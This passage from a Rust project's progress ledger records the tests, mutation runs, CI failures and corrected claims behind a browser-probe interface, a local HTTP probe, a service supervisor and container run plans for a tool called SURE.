platform-gated tests are all counted by grep and only some of them are compiled.
Take the numbers from a run, and use the per-file *deltas* when the question is
what a commit added.

### Count the parent lines, not the `test result:` lines

**The raw number of `test result: ok` lines overstates this suite.** A workspace
run now prints **33** of them for **726** tests — 19 test binaries + 4 doc-test
targets + the **ten** child processes `store_concurrency` spawns (4 writers + 6
openers), each of which prints its own `test result: ok. 1 passed; … 6 filtered
out` into the parent's stdout. `--quiet` does not suppress that summary line —
libtest's `--quiet` drops the `running N tests` line and the per-test lines and
still prints the summary. The comment in `spawn_child` said otherwise and has
been corrected.

**The figures in the paragraph above are a reading with a date on them, and the
shape is the durable half.** As of `P3-T003` — the last acceptance that re-read
them — a workspace run prints **43** result lines for **33 parents + 10 children**,
the parents being **29** named test binaries + 4 doc-test targets, and the ignored
count is 9. The three components moved for three different reasons and the
arithmetic still closes: two binaries arrived at `P3-T001`, `Doc-tests sure_core`
gained the `no_run` example, and the children stayed at ten throughout. **A reader
comparing this paragraph against a run should find the command winning**, which is
the same rule as everywhere else in this file.

**So the raw line count can undercount as well as overcount, and it did.** One
captured log of this suite held **32** result lines where 33 are expected. The
missing one is identified rather than guessed: it is **`Doc-tests sure_testkit`,
a section that runs 0 tests**, whose summary line did not survive the capture.
That is why the arithmetic still looked right — a zero-test section contributes
0 to a sum — and it is the reason `count_tests.py` takes the **last** result
inside each `Running …` / `Doc-tests …` section instead of counting lines at
all. A line count is a property of the capture as much as of the suite, in both
directions: ten extra lines from the children, and one line fewer from a stream
that raced.

This matters for the record, not just for tidiness: the figure written into
`P1-T005`'s acceptance note (**408 passed**) was a raw sum of those lines and is
therefore **inflated by the child lines**. The true parent-only figure at
`P1-T005` was 396 passed / 1 ignored, i.e. 397 tests; `P1-T008` adds `sure-cli`'s
33, which was the 429 of that era. Nothing regressed — the earlier number was
counted wrong.

**`target/tmp/count_tests.py` (git-ignored) is the script that gets this right**,
and it is worth reusing rather than re-deriving. It parses one section per
`Running … (path)` or `Doc-tests …` header and takes the **last** `test result:`
inside each. Three things it had to get right, each of which produced a wrong
total first: cargo writes the `Running` markers to **stderr** and the binaries to
**stdout**, so the two streams must share one pipe with ordering preserved
(`stderr=subprocess.STDOUT` — `capture_output=True` cannot be combined with it);
`store_concurrency`'s children print `test result:` lines of their own; and
doc-tests print `test result:` with no `Running` marker, so "last line wins"
alone lets them overwrite the section before them. Five different wrong totals
came out of getting these wrong in turn — 485, 482, 137, 0, 0.

`store_concurrency` takes about a second and its children show up in the output
as lines of nine characters each. `tests/store_concurrency.rs` and
`tests/cli_contract.rs` are the only two files that spawn processes.

## What `P3-T011` added

One file, `crates/sure-core/src/browser.rs` — **843 lines of module above its
`#[cfg(test)]` and 418 below it, 1261 in all**, nineteen `#[test]` functions in a `mod tests` inside the
module — and one new integration test file,
`crates/sure-core/tests/browser_probe.rs`, **seven `#[test]` functions**.
`lib.rs` gains one line. **No file outside `sure-core` changes**, and no driver
is implemented: that is `P5-T004`, which depends on this task.

**The first draft of this paragraph said `browser.rs` was "959 lines of
implementation plus 302 of its own tests", and the 959 is `probe.rs`** — the file
one task over, whose accepted-work entry reads *"959 lines, 3 module unit tests"*.
The 302 was then only the remainder, `1261 − 959`, and described nothing: this
file's own test block is 418 lines and `probe.rs`'s is 69. **A number borrowed
from the adjacent entry is worse than a missing one**, because it reads as a claim
about a file the reader will not open and the arithmetic agreed. It is recorded in
`DECISIONS.md` beside the mutation-count correction, which is the same failure in
a different field: **the code was right and the ledger about the code was wrong
twice, and neither error was one the build could have caught.**

### The acceptance's first sentence is a value, and all five of its roads end in `skipped`

*"Browser unavailable => skipped/unknown."* `Report` is `Absent(Absence)` or
`Observed(Observation)`, and there is **no `Result` anywhere in the interface** —
there is no browser is a fact about this machine, not an error, and a type that
made a caller handle it as one would invite a caller to handle it wrongly.
`AbsenceReason` has five variants, each maps to a `NotCheckedReason`, and
**`every_absence_reason_is_skipped_and_none_of_them_produced_a_result` loops over
`AbsenceReason::ALL`** — over the list the enum declares, not over the variants
somebody wrote a case for — asserting `Skipped`, `is_green() == false` and
`produced_a_result() == false`. A sixth reason added later that landed on a
`pass` fails there.

**Four of the five blocks green and the fifth is the user's own decision.**
`NoDriverInstalled`, `DriverWouldNotStart`, `PermissionNotGranted` and
`UnsupportedPlatform` all answer a `NotCheckedReason` whose `is_scope_limit()` is
false, so a critical browser check that could not run keeps the run out of green.
`DisabledByTheProject` is a scope limit and stops the check blocking — **and does
not make the run green**, which is where a first draft of the test was wrong and
the code was right: `aggregate` keeps an out-of-scope critical check visible, so
the run lands on `NeedsAttention`, or on `NotEnoughChecked` when nothing ran at
all. Both are measured in `a_critical_absence_that_is_not_a_scope_limit_blocks_green`.

### `UnsupportedPlatform` was `UnsupportedStack` for one run, and that was a hole

`UnsupportedStack` is a scope limit. A critical browser check on an operating
system SURE cannot drive a browser on would therefore have **stopped blocking
green** — a reassuring status for the case where SURE knows least. The
definition is what settles it: the domain calls a scope limit one *"that the user
chose or that the project shape implies"*, and neither half holds for the
operating system SURE is running on. Three of the five reasons now answer
`ToolUnavailable`, which is not a loss of detail — they are one group, *no way to
drive a browser here*, and the difference between them survives in
`plain_explanation`, which is the sentence a report prints.

**The test found this, not a review.** The first version of the test asserted a
four-reason blocking list and the mapping produced three; the mapping was the
thing that was wrong.

### The false green was in the interface, and no mapping could have fixed it

**A page served a 404 renders, has a title, reports no console errors and loads
completely.** Every field of the first draft's `Observation` added up to a pass
about a page that was never served, and the mapping was not the defect — **a
driver had no way to say the status**, so the type was. `document_status:
Option<u16>` is now part of `Observation`.

**`None` is `Unknown` and not a `pass`.** This is the same technique as
`ProbeOutcome::NoAnswer` one module over, and the reason is the same: staying
silent is not an answer. A driver cannot reach green by omitting the field, and
does not have to invent a status code to avoid it. The check that holds it is
`a_driver_that_did_not_say_what_came_back_cannot_reach_green_by_saying_nothing`.

### The status window is the probe's, tied by a sweep rather than a shared function

`a_page_could_be_shown` restates `ProbeOutcome::status`'s 200–399 guard, and
`the_page_status_window_is_the_local_probes_window` **sweeps every status from
100 to 599** asserting `Report::status` and `ProbeOutcome::status` agree on each
and that green is true exactly on 200–399. Two spellings and a test, rather than
one function, because the probe's is a guard on an enum variant inside a `const
fn` and this one is a question about a number a driver reported — **the shared
spelling was tried first and clippy rejected it at the non-`const` call site**,
which is what produced the pair. That the pair is safe is measured rather than
argued: **`m11` moved the probe's own window to 200–500 and the sweep caught
it.**

### The isolation is a source rule, because an absence cannot be run

`crates/sure-core/tests/browser_probe.rs` carries five rules, written the way
`spawn_sites.rs` and `fingerprint_git.rs` write theirs.

**One: the verdict machinery does not know what a browser is.**
`crates/sure-domain/src/status.rs` — which owns `CheckStatus`, `CriticalState`,
`blocks_green` and `aggregate` — contains none of `browser`, `console`, `page` or
`driver`, in code or in prose. It contains none of them today, which is what
makes the rule a real constraint rather than a description, and the words are the
four that a leak would arrive as.

**Two: a driver cannot spell a verdict.** The test parses
`pub trait BrowserDriver { … }` out of the source and asserts its body names
neither `CheckStatus` nor `CheckResult` — and it refuses a parse that found
nothing rather than treating an empty block as a block with nothing in it, which
is the "a parse that fails into a smaller, plausible answer" defect this
repository has hit before.

**Three: there is one door.** `-> CheckResult` and `-> CheckStatus` each occur
**exactly once** in the part of the module above its `#[cfg(test)]`. The split is
needed because the module's own tests declare a helper that returns a
`CheckResult`, and it refuses to run when there is no test module rather than
silently counting test code as shipped code.

**Four: the window sweep**, above.

**Five: nothing in the product can drive a browser yet** — no shipped file
outside `browser.rs` names `BrowserDriver`, and
`decide(BrowserProbe, InspectOnly, inspect_only())` is `Denied`. **This rule is
meant to fail**: `P5-T004` is the adapter, it depends on this task, and that
commit is where somebody reads the paragraph.

### What the isolation does not claim, written next to the mechanism

**The interface keeps a driver from *spelling* a verdict; it does not keep a
driver from being *wrong*.** A driver that reports `complete: true` and no
problems about a page that threw has lied, and nothing in the module can tell.
What is enforced is the direction that matters — **no driver can hand SURE a
status, so no driver can put a green in a report by asking for one** — and the
observations are checked by a second driver, not by this file. The paragraph is
in the module header because the claim is one a reader can check, and `P3-T010`'s
correction is the precedent for writing it down: a claim the code contradicts is
worse than a missing claim, because it reads as a defence that was built.

### `Target` wraps `Endpoint` rather than restating the loopback rule

One refusal rule in the codebase, not two that agree today. It matters more here
than in the probe: **a browser navigates to the internet happily.** A subject
built from a `String` can name `https://example.com`, which would make a browser
check an `ExternalService` action reaching a machine that is not this one, under
a permission SURE asked for on the understanding that the target was local. So
the subject is a type built from an address and a path, the scheme is not a
parameter, and **there is no constructor that takes one**. The refusals are
`Endpoint`'s own `EndpointError` values — `NotLoopback` and `UnsafePath` — and not
a reworded twin.

### What `P3-T011` did not do

**No browser is started and no driver exists.** `browser.rs` builds no
`std::process::Command`, so `tests/spawn_sites.rs`' census is unchanged by it —
which the full suite confirms rather than this sentence. **No limits are enforced
by this module**: `Limits` is what a caller hands a driver, and honouring it is
the driver's job, stated in the trait's documentation rather than assumed.
**Nothing here looks at a real page**, so every observation in both test files is
one this repository constructed.

## What `P3-T010` added

One file, `crates/sure-core/src/probe.rs`, and one new integration test file,
`crates/sure-core/tests/probe_local_service.rs` — **twenty `#[test]` functions**,
plus **two unit tests inside the module**. `sure-domain`'s `status.rs` gains
`CheckResult::unknown` and one test for it; `lib.rs` gains a line. **This is the
first task since `P2-` to add a constructor to the frozen vocabulary**, and the
reason is in the next section but one.

### The acceptance's second sentence is a type, not a rule

*"Open port alone is not feature completeness."* `ProbeOutcome` has five
variants, `is_an_answer` is true for exactly one, and **the port question is a
method `opened_a_connection` that no verdict consults** — `status()` matches the
variant and never calls it, so a caller who learns the port is open still cannot
turn that into a pass. The variant that means *something accepted the connection
and said nothing* is `NoAnswer`, which maps to `CheckStatus::Unknown`, which
`aggregate` treats as **not checked**. The test that holds this goes through
`aggregate` rather than through the module's own enum:

```
an_open_port_that_says_nothing_does_not_aggregate_to_green
the_same_open_port_that_answers_does_aggregate_to_green
```

**The pair is the instrument.** The first alone would be satisfied by a probe that
never returns green at all; the second alone by the false green this product
exists to prevent. They differ by one line of server behavior, and the servers are
real sockets on `127.0.0.1:0` — the port is never hardcoded, so a machine with
something already on `3000` cannot make them lie.

**This section said "there is no boolean anywhere in the module" until a grep for
`pub fn … -> bool` in that module returned two, and the sentence was false in
three places.** `opened_a_connection` is public, returns `bool`, and is true for
exactly the ported-yet-silent case the paragraph was about; the module's own
rustdoc header carried the same false claim, so it was on course to ship in the
crate's documentation. **What is true is narrower and checkable**: the boolean exists and
is deliberately *named so it cannot be mistaken for the answer*, and no verdict
path reads it — `status()` is an exhaustive match on the variant with no `_` arm,
so a new variant is a compile error there rather than a silent route onto the
green path. The correction is `P3-T010`'s third commit, and the mutation table
does not change: no test could have caught a false sentence, which is why the
false sentence is recorded rather than patched quietly.

### `CheckResult::unknown`, and why the vocabulary needed a new door

The frozen vocabulary exposed `CheckStatus::Unknown` with **no constructor**, and
this is the first check that needs one. It is the only status whose evidence class
is a *parameter*, and the parameter is the whole of what separates it from
`not_run`: **here SURE has evidence and the evidence supports no verdict; there
SURE has none.** A probe that found a port open and nothing said has an observed
fact, and the fact is not a basis for saying the project is fine or that it is
broken — which is a state nothing in the vocabulary could previously express.

### A zero timeout makes no attempt, because rounding it up can produce a pass

Three implementations were considered and two are wrong, and **the reason is the
same for both**: a loopback socket connects in microseconds, so *any* budget small
enough to be "no time" is also large enough to answer. Rounding a zero up would
have reported a **green check out of a budget of zero**; handing the zero to
`connect_timeout` lets the platform reject it, and the caller learns the operating
system refused something the caller had already asked not to happen. It is
`Unreachable` with a detail naming the budget — `CheckStatus::Error`, never green.

**A zero *byte* bound is deliberately not treated the same way**, and the module
says why rather than leaving the asymmetry to be noticed: with nothing kept, no
header block can be found, so a zero bound cannot reach a pass.

### `NotHttp` is decided from the first byte, and that started as a bug

A port speaking TLS, probed with a plaintext request, answers with a binary record
that contains **no CRLF at all**; a service whose protocol name does not begin with
`H` is contradicted by its first byte. Under a reader that waited for `\r\n\r\n`,
**both were reported as a port that said nothing** — the least useful thing a
report can say about a port that answered. `could_still_be_a_status_line` reads the
same grammar as `parse_status_line` as a condition on a prefix, so the first line
is settled as soon as its bytes can no longer begin a status line.

**The same predicate ends the read**, and that second half was found by a test
asserting on *elapsed time* rather than on a value. It failed at 5.0s against a
five-second hold: **the outcome was right and the deadline had produced it.** A
value-only assertion cannot see this class of bug, which is why the TLS test and
the early-break test both assert how long the probe took.

### Ten mutations, ten caught — and the one that survived is the finding

`m8` deleted the `WouldBlock` arm of `is_a_timeout` and **all twenty integration
tests passed.** That is a gap in the platform, not in the tests: **Windows reports
an expired socket read timeout as `TimedOut` and a Unix reports the same condition
as `WouldBlock`, so no test reachable from a socket on this machine can produce the
Unix spelling.** The arm was held by nothing here. Without it, a Unix build reports
a port that said nothing as a port that *could not be reached* — an observation
about the project turned into a failure of the probe, on two of the three CI
platforms. It is now held by a unit test in the module, and **that test is the only
thing in `sure-core` that catches it.**

**The harness's own filter was the second half of the finding.**
`--test probe_local_service` selects an integration target and does not run the
lib, so the first re-run after adding the unit test still reported a survivor. **A
mutation reported as surviving under a filter that could not have run the test that
kills it is a measurement of the filter**, and the previous eight tasks' mutation
tables all used integration filters.

**Seven of the ten are caught by exactly one test each, and two of those seven
share a test.** `m5` (widening `is_an_answer`) and `m7` (replacing the silence
reason) both land on `an_open_port_that_says_nothing_does_not_aggregate_to_green`,
which is also the test the acceptance is about. **Ten-for-ten would be true and
misleading**; the concentration is recorded in `DECISIONS.md` because it is the
shape a future deletion would exploit.

### Two predicates a socket cannot discriminate, so they have unit tests

The second unit test is not a mutation survivor — it is the same instrument
pointed at the other predicate a socket cannot separate. Every server in `tests/`
that sends a complete response sends a blank line with it, so **the socket route
only ever exercises the split path**. `could_still_be_a_status_line` is therefore
tested directly, on inputs a test server cannot produce.

### A free port can connect to itself, and the run that found it could not have caused it

`0eb1ac3` changes one doc comment and nothing else, and its run `34956776646` came
back **windows `failure`, macos `success`, ubuntu `success`** on one assertion:

```
a closed loopback port refuses the connection; the probe reported
NotHttp { first_line: "GET / HTTP/1.1" }
```

`GET / HTTP/1.1` is **the probe's own request line**. The test had released a
loopback port and probed it; the connect *succeeded* and the bytes read back were
the bytes the probe had written. **A doc-only commit cannot make a test fail**,
which is how this was known to be the code before the cause was known.

**When the operating system hands the dialled port out as the source port of the
connection, the connection loops back on itself** and everything written arrives
in its own receive queue. Nothing is listening; the probe talked to itself. It is
documented TCP behaviour rather than a Windows quirk, and **on loopback the
giveaway is exact: a real connection's local port can never equal the port it
dialled**, because that port is held by whichever socket is listening and cannot
also be an ephemeral source port. So `is_a_self_connect` is checked between the
connect and the write, and it maps to `Refused` — the same fact `ECONNREFUSED`
carries, and the same `fail`. **The test was right and the product was wrong**,
which is the second time in this task the suite was ahead of the code.

**The predicate is tested; the branch that uses it is not.** The unit test is
deterministic on all three platforms because it takes two addresses directly.
The branch in `get()` cannot be exercised on demand, and **`m11`, the mutation
that deletes it, survived the whole `sure-core` suite** — as the test run
immediately before that commit did. Forcing a self-connect means asking the
operating system to choose a particular port: dialling ports that had just been
released gave **0 self-connects in 40 attempts**, and the same measurement found
that a refused connect on this machine takes about **2.04 seconds** to come back.
A brute-force search is not a test but a timeout, and a retry loop would have
hidden the gap rather than naming it, so the gap is named.

**And the measurement turned up a property of the budget.** A refusal is slower
than a connect, and the connect is charged to the budget, so **a budget below the
platform's refusal latency reports `Unreachable` — an `error` and the probe's own
failure — where a longer one reports `Refused`, which is a `fail` about the
project.** Both are non-green, so nothing here can manufacture a false green;
what changes is which of two sentences a report prints, and only the longer
budget prints the one about the project. It is in `get`'s documentation without a
number, because the latency belongs to the platform.

### What the first draft got wrong, and the tests caught

Three things, none of which a green suite would have surfaced, and the second and
third are worth the reader's time:

- **The byte bound was a *soft* bound** — checked between reads, so a 4 KiB chunk
  could put **1024 body bytes under a 512-byte bound**. It is now what is kept,
  exactly, and the test asserts the arithmetic rather than a range.
- **The first line of a never-ending reply is "whatever arrived"**, up to the whole
  bound, so a report could have carried sixty kilobytes of lossy-decoded binary.
  It is now cut at 120 bytes with `…` marking the cut, so a cut line cannot read as
  a whole one.
- **An early-break guard on `header_block_end` was written, reasoned about and
  removed.** The predicate reads only as far as the code token, so a valid status
  line satisfies it however long the buffer is, and the guard changed no behavior
  the tests could see. Its comment now says why no guard is needed rather than
  claiming a condition that does nothing.

And one claim in the module's own documentation was false when written:
**`verdict`'s doc said it was "written against" `status()` while re-implementing
the same match.** It now calls it, so the claim is true; the catch-all `_` arm
became an explicit `Error | Warning | Skipped` arm so that adding a variant to
`CheckStatus` is a compile error in that file rather than a silent mis-mapping.

### What `P3-T010` does not establish

**Nothing about whether the feature works.** A pass means a request was answered,
the title names the request — `local probe: GET /health HTTP/1.1 answered` — and a
test asserts the title does not say "works" or "ready". **No body is parsed,
decoded or matched**, so `body_bytes` counts what arrived after the header block:
the body for an identity-encoded response, and including chunk framing for a
chunked one. **No header is parsed, `Content-Length` least of all** — the end of a
response is the end of the connection and nothing else, so a service that keeps its
socket open is `truncated` after costing the whole timeout even when it sent a
complete body. **Nothing here is asynchronous**, and one probe blocks for up to its
timeout. **Nothing about a hostile peer**: every server in the tests is one this
repository wrote.

## What `P3-T009` added

One file, `crates/sure-core/src/service.rs` (411 lines), and one new integration
test file, `crates/sure-core/tests/service_supervisor.rs` — **eight `#[test]`
functions, of which six are the claims and two are the children they start**.
`enforce.rs` gains `AdmittedCommand`; `process/mod.rs` gains `run_when_started`;
`lib.rs` gains a line; the ceiling paragraph in `support.rs` is rewritten rather
than left stale; and `tests/spawn_sites.rs` goes **from one rule to three**. **The
module is a fourth layer over the runner and it holds no `Command::new` of its
own**, which is what the census in `spawn_sites.rs` exists to keep true.

### The acceptance sentence is four words, and each has a different kind of answer

*"Can start/stop supported local services with timeouts and captured logs."*

**supported** is a type: `Supervisor::start` takes an `AdmittedCommand<'_>` and
nothing else — not a program name, not an argument list, not a `&str` — so what
starts is what `Enforcement::admitted()` decided may start, and the supervisor
cannot form a command line of its own to disagree with. **start/stop** is
`Service::stop`, which asks for the **process tree** and asks for the cancellation
*before* it waits. **timeouts** is `Limits::timeout`, and the module says out loud
that it is the **whole-life budget of the service and not a startup timeout**,
because those two readings differ in exactly the case a caller is most likely to
be in. **captured logs** is both streams arriving on the `Outcome`, each bounded by
`Limits::stdout_bytes` and `Limits::stderr_bytes` — and **once, at the end, not as
they are written**, which is the design of `process` rather than a choice this
module made, and is stated as the limitation it is.

### The door is a type, and the paragraph it replaced was a rule for callers

`P3-T007`'s note says a runner must take what it launches from `admitted()` and
from nowhere else, and `Enforcement::admitted()` is the only door. **That was a
rule about callers, held by nothing.** This task makes it a fact about a type:
`AdmittedCommand<'a>` wraps the `PlannedCommand`, its constructor is private, and
`admitted()` is still the only producer — **so a caller cannot witness a decision
nobody made, and a runner that takes an `AdmittedCommand` has no way to be handed
anything else.** The one place in the repository that consumed the iterator item
directly was rewritten to consume the witness instead.

**The rejected alternative is worth recording because it is the shape this
repository already uses elsewhere.** A grep test over `PermissionPlan::commands()`
would have held the rule the way `spawn_sites.rs` holds the spawn census — but a
grep holds a rule about **text**, and this is a rule about **authority**. A caller
that named the wrong iterator would be caught; a caller that built a command line
from whole cloth would not.

### A callback at the last point before the wait, because "started" must mean one thing

`process::run_when_started` fires a caller's closure after every fallible step and
after both streams are being read. Every `return` above it is a run that never
began. `Supervisor::start` returns `Ok` only once that callback has fired, so **a
service reported as running is a process the operating system accepted and SURE is
reading** — not one that might still be failing to spawn. The alternative was for
`start` to return immediately and let callers poll, which moves a race into every
caller and makes the module's central sentence false precisely when a spawn fails.

**And there is no `is_ready`.** Whether a service is *listening* and whether it
*answers* are a probe's questions, which is `P3-T010`; the word does not appear in
this module's vocabulary. **Reporting readiness from the fact that a process exists
is the false green this product is built against**, so the fact is named at the
type level and there is nothing here to mistake for an answer: a service that comes
up and immediately dies is `start` returning `Ok` followed by `has_finished()`
being true.

### Two things the build had to measure, and both were bugs when first written

**`Service::stop` destructures every field, and that is a fix rather than a
style.** `let Service { running, .. } = self;` leaves the un-moved `stopper` alive
until the end of the function — *after* the wait, and the wait is on a run that
ends only because `stopper` drops. **Deadlock.** It was proved with a `Drop` that
prints, not by reading: the first version printed `drop Stopper` *after* `done
waiting`. `Stopper` is a separate type for the same reason — `stop` takes `self`
and must move the `JoinHandle` out, and a type with a `Drop` cannot have its fields
moved out.

**A stop that arrives before the deadline is a cancellation, not a timeout, and
the test asserted the opposite.** The deadline test asserted `TimedOut` and got
`Cancelled { stopped: WholeTree }`, because `stop` cancels first. The test now
waits for `has_finished()` and then stops, and asserts `outcome.took() >= BRIEF`.
**The word *already* in the documentation of `stop` is load-bearing**, and it is
the reason that test is written the way it is.

`ServiceError::CancelledBeforeStart` was planned and **dropped as unreachable**:
the `Cancellation` is created inside `start`, so nothing can cancel before a start
and the variant would have had an arm nothing could reach.

### The arm documented as unreachable, and the mutation that reached it

The `Err` arm of `start`'s `match` reports `NotFollowed` when a run ends without
ever having reported that it was under way — possible only if
`run_when_started` breaks its own contract, **which a test cannot do**. Mutation
`m2` deletes the single call to `started()` and therefore *is* that break, and the
test's own words are the evidence:

```
NotFollowed { message: "the run ended as TimedOut { stopped: WholeTree } without
ever reporting that it was under way" }
```

**So the documented-unreachable path is reachable, and when it is reached it
carries the termination instead of discarding the outcome** — which is what its
comment claimed and what nothing had checked until this ran. It is also why the
arm is written out rather than folded into the one above it: a run that ended and
cannot be vouched for is exactly what `NotFollowed` is for, and the alternative is
to throw an outcome away.

### Seven mutations, seven caught, and one test holding three of them

| mutation | what it breaks | caught by |
| --- | --- | --- |
| m1 | the callback fires before the spawn | `a_program_that_is_not_there…` |
| m2 | the callback never fires | `a_service_that_outlives_its_budget…` |
| m3 | dropping a service does not stop it | `a_service_that_is_dropped…` |
| m4 | the wait comes before the cancel | `a_service_starts_is_stopped…` |
| m5 | `has_finished` is always true | `a_service_starts_is_stopped…` |
| m6 | the streams are kept with no room | `a_service_starts_is_stopped…` |
| m7 | the working directory is ignored | `a_service_that_ends_by_itself…` |

**Every mutation was caught by exactly one test**, and **one test is load-bearing
for three properties at once**: `a_service_starts_is_stopped_and_both_of_its_
streams_are_kept` catches m4, m5 and m6. That concentration is recorded because it
is the shape a future deletion would exploit — the suite is not redundant here, and
a reader who took "seven mutations, seven caught" as redundancy would be wrong
about three of the seven.

### The macOS red, and the precedent that was one file over

Run `34952200942` was **windows success, ubuntu success, macOS failure**, and the
failure was worth more than a green job would have been. The assertion *"a service
runs in the directory its supervisor was given"* compared the child's
`std::env::current_dir()` — resolved through every symlink — against a path built
from `std::env::temp_dir()`, which is not:

```
left:  "/private/var/folders/…/T/sure-service-ends-by-itself-6514/working"
right: "/var/folders/…/T/sure-service-ends-by-itself-6514/working"
```

**The same directory, two spellings, because `/var` is a symlink to `/private/var`
on macOS.** The service did exactly what the assertion was written to check, so
this is a **false red** — the mirror of the false green this product is about, and
recorded for the same reason: an assertion that fails for a reason unrelated to its
claim teaches a reader to distrust the suite.

**The precedent was already in the repository.** `P3-T001`'s `tests/process_runner.rs`
asserts this exact claim about this exact runner and canonicalizes **both** sides,
with a comment explaining that Windows returns the same directory with a different
drive-letter case. **That comment gives one platform's reason for a rule that holds
on every platform**, and the next file to compare a directory copied the shape and
not the rule. The fix adopts the idiom and the comment now names both cases.
`12b81bc` is the fix, and **the census says what kind of change it was**: run
`34952509429` reads macOS **1217 → 1218** and Windows and Ubuntu unchanged at
**1217** and **1219**, over the same **46 result lines = 36 parents + 10 children**
on all three, and `name-delta.py` between the red run and the green one is
**`+0 −0` on every platform**. So no test was added, removed or renamed: one
assertion that was wrong became an assertion that is right, and the one platform
that could tell the difference moved by exactly one.

## What `P3-T008` added

One file, `crates/sure-core/src/container.rs`, 16 module tests, and one new
integration test file, `crates/sure-core/tests/container_isolation_claim.rs`, with
5. `crates/sure-core/src/lib.rs` gains a line; `doctor.rs`, `sure-domain`'s
`execution.rs`, `docs/adr/0009` and `docs/architecture/EXECUTION_SAFETY.md` are
each corrected in place. **The module states the boundary it is not**: nothing in
it builds a `std::process::Command` and nothing names a `ProcessRequest`, so the
census in `tests/spawn_sites.rs` is unchanged and that test is what says so.

### The first acceptance sentence is a missing variant

*"Docker/Podman absence is nonfatal."* `Availability` is `Found { runtime,
program }` or `Absent`, and **there is no third arm, no `Result` and no error
type.** That is not brevity — it is the sentence, expressed as a shape. A caller
who wants a `Runtime` has to handle the absence to get one, so "nonfatal" is a
property of the type rather than a convention somebody remembers. The alternative
was an `Err(String)` that a caller could `?` past, and the failure mode of that is
a machine told its setup is broken when it is the ordinary case: most machines
have neither Docker nor Podman, and SURE's answer to that is that checks run on
the host under the mode `P3-T007` built.

`Availability::explain()` is where the nonfatality is legible: the `Absent` arm
says what *does* happen rather than only what is missing, and both arms are
asserted in the unit tests and again from outside the crate. **The asymmetry
between the two arms is deliberate** — the found arm names the runtime and where
it is, because "which one" is a support question that is unanswerable after the
fact if the answer was never recorded.

`in_path` takes a search path, `on_this_machine` reads `PATH`, and both go
through `doctor::find_in`, which is now `pub(crate)`. That was the smallest
change that could work: a second copy of *what SURE would execute* would be a
second answer to a question `sure doctor` already answers, and the two could
disagree about whether a program is installed. Two callers is a shared helper;
the doc comment says a third is where it moves into a module of its own, which is
the same move `consent::runs_project_code` got in `P3-T007`.

### The plan is a value, and its defaults are the whole of the safety story

`ContainerPlan` holds an image, a `Mount` (host path, container path, `Access`),
a `Network` and a working directory. `arguments()` returns the vector as
`Vec<String>`; `arguments_as_os_strings()` is the same vector in the form a runner
would be handed. **No argument is ever interpolated through a shell**, and the
image is the last element with the command left to the caller: a plan that named a
command would be this module deciding what to run, which is `enforce.rs`'s
question and not this one's.

The three defaults are the acceptance's second clause in the only form that can be
asserted: **`Access::ReadOnly`**, **`Network::Off`**, and a working directory of
`/project` — never the host's path, which does not exist inside a Linux image.
`with_writable_project()` and `with_network(...)` exist, and they are *calls*, so
the one widening this plan can make is a line somebody wrote and a reviewer can
see. A test walks three plans and fails on `--privileged`, `--publish`, `-p`,
`--pid` or `--cap-add`: **the two widenings this plan has no method for are
checked rather than documented**, because a plan that gained either would be one
whose isolation claim is no longer the one `isolation_claim()` makes.

Three things are refused at construction rather than emitted: an empty image, a
working directory outside the container's view of the project, and **a host path
containing `,` or `=`**. That last one is the interesting refusal. `--mount` is a
comma-separated `key=value` list, so a path with either character in it re-splits
into fields that are not this plan's; the short `-v source:target:ro` form takes
the path but cannot carry a Windows path at all. **There is no spelling that works,
so there is a refusal instead of a fallback** — and refusing fails closed, which is
the direction an ambiguity like this has to fail in. A space is not an ambiguity
and is accepted, which a test states, because refusing spaces would refuse most
Windows paths.

### The asymmetry between the mount and the network is the point

`Network` is one of the five `CommandClass` categories, so a command's effects
**can** answer *does this need a route out?*, and `ContainerPlan::for_command`
derives it. **Nothing can answer *may this write inside the project?*** — the five
categories are static, dynamic host, install, network and destructive, and `npm
test` writing `target/` is `DynamicHost` while `git status` writing nothing is
`Static`. The missing category is the open owner decision this file has carried
since `P3-T004`, and **this is the first task to be blocked by it rather than
merely to mention it.** So `Access` is an argument, the default is read-only, and
nothing guesses.

Both halves are tested, and the second is the one that matters:
`the_network_never_widens_the_mount` walks `static_only()`, `anything()` and an
install-only set past `for_command` and fails if any of them moves the access
mode. **The asymmetry is a test rather than a comment**, because the tempting
simplification — derive both from effects, default the one you cannot derive — is
exactly how a guess arrives wearing a rule's clothes.

### The second acceptance sentence is about prose, and four places were failing it

*"…and is described as limited isolation, not perfect sandboxing."* The wording
half is not a type. Four places called this mode **isolated** and stopped there:

| where | what a reader took from it |
|---|---|
| `ExecutionMode::Container`'s doc comment | that the mode is a boundary |
| `ExecutionMode::Container::plain_description()` | **the sentence a user reads before agreeing** |
| `docs/adr/0009`, the `container` row | that the decision was for an isolated environment |
| `docs/architecture/EXECUTION_SAFETY.md` | that SURE executes in an isolated container |

None of the four was written carelessly — *isolated* is the word the whole industry
uses for this, which is exactly why a one-time correction would not have been
enough. `OVERCLAIMS` is the list (two phrases), `overclaims(sentence, phrase)` is
the rule, and `tests/container_isolation_claim.rs` applies both to every shipped
`.rs` under `crates/` and every `.md` under `docs/`. **`progress/` and
`MASTER_PROMPT.md` are excluded and the exclusion is argued**: those are dated
records of what was written at a time, and editing them to agree with today would
be the document half of rewriting history.

The prompt was rewritten inside a constraint that made it harder and better. The
consent prompt is the one sentence here that reaches somebody who did not go
looking for it, and `mode_descriptions_are_plain_language` bans the word
*sandbox* in it as jargon — so *"not a sandbox"* was not available. It says
**"That is limited isolation: it narrows what a check can reach, and it is not a
separate computer"**, which is the honest everyday form of *shares the host's
kernel* and does not require the reader to know what a kernel is.

### The rule that holds the wording made both of its own mistakes, and the tests found both

`overclaims` excuses a phrase only inside the clause that contains it, because
*"Docker is not installed, and the container is an isolated container"* is two
claims and a rule that read the whole sentence would excuse the second.

**The first clause-boundary set was `.` `;` `:` and the newline, and the sentence
just quoted — written into the function's own test as the example of what it must
catch — passed the rule.** A comma is where English puts the joint between two
independent clauses, and a rule that understands only full stops reads the second
one as part of the first. Adding `,` makes the rule **stricter**, so the mistake
was in the safe direction and was still real: the check would have excused exactly
the sentence its documentation named as its purpose.

**The second was in the ADR correction itself.** The first version quoted the old
wording in order to correct it, and the scan flagged it — correctly, because the
rule cannot tell a quotation from a claim and does not pretend to. The fix is to
**name which word moved rather than reproduce it**, and the ADR now says so and
says why. That is a limitation stated rather than papered over: a rule that read
intent could be argued with, and the cheap checkable version is worth more than
the clever one.

### The check found a coverage gap in a file it only borrowed from

`doctor::find_in` documents that an empty `PATH` entry is skipped rather than read
as the current directory — on Unix an empty entry *is* the current directory, and
